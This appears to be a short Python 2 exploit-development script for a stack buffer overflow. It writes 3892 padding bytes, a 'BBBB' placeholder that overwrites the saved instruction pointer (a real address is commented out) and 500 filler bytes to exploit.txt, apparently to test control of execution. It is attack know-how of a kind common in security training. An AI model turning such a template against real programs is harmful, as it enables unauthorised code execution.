#!/usr/bin/python

import struct

total_length = 4500
offset = 3892
new_eip = "BBBB" #struct.pack("<I", 0x0804862b) 

payload = [
	"A"*offset,
	new_eip,
	"C"*500
]
payload = b"".join(payload)

with open('exploit.txt','wb') as f:
	f.write(payload)
